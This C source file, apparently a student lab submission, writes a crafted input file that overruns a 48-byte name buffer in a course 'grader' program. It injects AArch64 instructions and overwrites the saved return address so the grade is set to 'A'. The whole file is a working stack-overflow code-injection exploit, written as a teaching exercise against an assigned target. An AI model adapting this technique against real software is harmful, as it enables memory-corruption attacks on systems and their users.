/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Sean Wang, Giao Vu Dinh                                    */
/*--------------------------------------------------------------------*/


#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

/* Size of name array */
enum {BUFSIZE = 48};

/*--------------------------------------------------------------------*/


/* Does not accept any command-line arguments or read text from stdin. 
   Writes a sequence of characters to file dataA designed to perform a 
   "A" buffer overrun attack on the grader executable. The sequence of 
   characters includes the student name, null bytes, and binary code.
   Returns 0. */

int main(void)
{
   unsigned int i;
   unsigned int uiInstr;
   unsigned long ulData;
   char* psName;
   FILE *psFile;
   psFile = fopen("dataA", "w");
   psName = "Sean Wang";

   /* Writes the student's name to the dataA file */
   for (i = 0; i < strlen(psName); i++) {
       fprintf(psFile, "%c", psName[i]);
   }

   /* Writes filler to the dataA file
   so instruction starts at multiple of 4 */
   for (i = 0; i < 3; i++) {
       fprintf(psFile, "%c", 0x00);
   }

   /* Writes the instruction mov w0, ‘A’ */
   uiInstr = MiniAssembler_mov(0, 'A');
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
   /* Writes the instruction adr x1, grade */
   uiInstr = MiniAssembler_adr(1, 0x420044, 0x420068);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes the instruction strb w0, [x1] */
   uiInstr = MiniAssembler_strb(0,1);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes the instruction b 0x400864 (call of printf) */
   uiInstr = MiniAssembler_b(0x400864, 0x420070);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes enough null bytes to the dataB file
      to overrun until X30. 28 is the number of elements filled
      in the name array by dataA. */
   for (i = 0; i < BUFSIZE-28; i++) {
       fprintf(psFile, "%c", 0x00);
   }

   /* Writes the address which corresponds to instruction: 
      mov w0, ‘A’ in BSS section */
   ulData = 0x420064;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   fclose(psFile);

   return 0;
}
